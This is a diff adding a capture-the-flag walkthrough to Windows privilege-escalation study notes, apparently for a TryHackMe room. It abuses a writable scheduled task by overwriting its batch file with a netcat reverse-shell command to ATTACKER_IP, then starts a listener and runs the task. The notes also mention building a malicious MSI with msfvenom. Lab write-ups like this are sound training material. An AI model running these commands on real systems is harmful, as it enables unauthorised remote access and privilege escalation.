@@ -103,3 +103,21 @@ Privilege escalation can be facilitated through misconfigurations, such as those
 2. AlwaysInstallElevated:
   - Windows Installer: MSI files can be set to run with elevated privileges if registry keys are configured. This allows unprivileged users to run an MSI that executes with administrator rights.
   - Registry Check: Use reg query to check if the necessary registry keys are set. If they are, generate a malicious MSI file using msfvenom and execute it with msiexec to get a reverse shell.
+### Q.1: What is the taskusr1 flag?
+Let’s start by getting info on the scheduled task called “vulntask”.
+```schtasks /query /tn vulntask /fo list /v```
+
+As discussed in the task description, we can edit the file if have the correct permissions. To check these we run the following command: ```icacls c:\tasks\schtask.bat```
+
+Now all we need to do is echo the nc64 command to the schtask.bat file to overwrite its content. Remember to change the ip.
+```echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat```
+
+And setup a listener on your attacker machine: ```nc -lvnp 4444```
+
+Finally, run the scheduled task with: ```schtasks /run /tn vulntask```
+
+And yes, we got a connection:
+
+And find the flag:
+
+#### Answer: THM{TASK_COMPLETED}
